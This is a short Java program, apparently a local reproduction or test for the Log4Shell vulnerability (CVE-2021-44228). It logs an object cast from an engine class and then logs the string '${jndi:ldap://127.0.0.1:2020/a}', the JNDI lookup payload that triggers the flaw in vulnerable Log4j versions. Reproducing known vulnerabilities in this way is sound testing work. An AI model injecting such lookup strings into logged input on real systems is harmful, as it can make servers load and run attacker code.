import jte2.engine.twilight.Application;
import jte2.engine.twilight.Area;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class CVE202144228 {
    static Logger logger = LogManager.getLogger(CVE202144228.class);

    public static void main(String[] args) {
        Object area = new Area();
        logger.info((Application) area);
        logger.info("${jndi:ldap://127.0.0.1:2020/a}");
    }
}
